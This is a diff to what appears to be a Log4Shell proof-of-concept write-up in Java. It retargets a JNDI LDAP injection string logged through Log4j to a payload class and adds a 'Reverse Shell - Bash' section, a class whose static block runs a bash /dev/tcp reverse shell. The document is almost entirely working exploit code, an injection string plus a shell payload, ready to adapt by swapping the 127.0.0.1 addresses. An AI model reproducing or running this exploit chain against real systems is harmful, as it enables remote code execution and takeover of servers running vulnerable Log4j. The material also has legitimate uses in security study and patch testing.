@@ -12,7 +12,7 @@ public class App {
     private static final Logger logger = LogManager.getLogger(App.class);
     public static void main(String[] args) {
         System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
-        logger.error("${jndi:ldap://127.0.0.1:1389/CreateFile}");
+        logger.error("${jndi:ldap://127.0.0.1:1389/Run}");
     }
 }
 ```
@@ -41,5 +41,23 @@ public class CreateFile {
     public static void main(String[] args) {
         CreateFile e = new CreateFile();
     }
+}
+```
+
+## Reverse Shell - Bash
+
+```
+public class Run {
+  static {
+    try {
+      String[] arrayOfString = {"/bin/bash","-c","/bin/bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"};
+      Runtime runtime = Runtime.getRuntime();
+      Process process = runtime.exec(arrayOfString);
+      process.waitFor();
+    }
+    catch (Exception exception) {
+      System.out.println(exception.toString());
+    }
+  }
 }
 ```
